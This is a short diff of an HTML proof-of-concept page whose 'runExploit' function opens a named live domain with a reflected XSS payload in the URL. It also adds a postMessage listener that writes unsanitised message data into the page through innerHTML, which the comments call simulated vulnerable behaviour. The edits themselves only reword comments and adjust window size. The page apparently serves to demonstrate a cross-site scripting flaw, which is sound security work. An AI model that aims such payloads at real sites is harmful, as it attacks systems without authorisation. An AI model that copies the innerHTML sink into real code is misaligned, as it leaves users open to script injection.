@@ -10,18 +10,18 @@
 
     <script>
       function runExploit() {
-        // Open the vulnerable site in a new window
+        // Open vulnerable site in new window
         const win = window.open(
-          "https://ads.realizeperformance.com/?x=<script>alert('XSS')</script>", 
-          "exploitWindow", 
-          "width=400,height=400"
+          "https://ads.realizeperformance.com/?x=<script>alert('XSS')</script>",
+          "exploitWindow",
+          "width=600,height=400"
         );
 
-        // Setup message listener
+        // Listen for postMessage
         window.addEventListener("message", function(event) {
           console.log("Received message:", event.data);
 
-          // Dangerous behavior (simulate injection vulnerability)
+          // Simulate vulnerable behavior (DOM injection)
           if (event.data && typeof event.data.value === "string") {
             document.body.innerHTML += "<p>Injected: " + event.data.value + "</p>";
           }
